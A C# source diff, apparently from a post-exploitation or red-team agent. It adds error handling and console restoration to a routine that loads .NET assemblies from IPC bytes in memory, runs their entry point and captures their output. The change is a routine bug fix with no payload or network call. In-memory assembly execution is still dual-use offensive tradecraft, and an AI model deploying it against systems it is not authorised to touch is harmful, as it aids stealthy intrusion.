@@ -83,6 +83,9 @@ namespace ExecuteAssembly
                 {
                     throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {asmArgs.GetTypeCode()}");
                 }
+                TextWriter originalStdout = Console.Out;
+                TextWriter originalStderr = Console.Error;
+
                 IPCCommandArguments command = (IPCCommandArguments)asmArgs;
                 EventableStringWriter stdoutSw = new EventableStringWriter();
                 EventableStringWriter stderrSw = new EventableStringWriter();
@@ -93,25 +96,32 @@ namespace ExecuteAssembly
                 Console.SetOut(stdoutSw);
                 Console.SetError(stderrSw);
 
-                Assembly asm = Assembly.Load(command.ByteData);
-                var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
-                if (costuraLoader != null)
+                try
                 {
-                    var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
-                    costuraLoaderMethod.Invoke(null, new object[] { });
-                }
+                    Assembly asm = Assembly.Load(command.ByteData);
+                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
+                    if (costuraLoader != null)
+                    {
+                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
+                        costuraLoaderMethod.Invoke(null, new object[] { });
+                    }
 
-                asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
-                _cts.Cancel();
-                while(_senderQueue.Count > 0)
+                    asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
+                    while(_senderQueue.Count > 0)
+                    {
+                        Thread.Sleep(1000);
+                    }
+                } catch (Exception ex)
                 {
-                    Thread.Sleep(1000);
+                    Console.WriteLine($"Unhandled exception from assembly: {ex.Message}");
+                } finally
+                {
+                    Console.SetOut(originalStdout);
+                    Console.SetError(originalStderr);
                 }
             }
-            else
-            {
-                _cts.Cancel();
-            }
+
+            _cts.Cancel();
         }
 
         private static string[] ParseCommandLine(string cmdline)
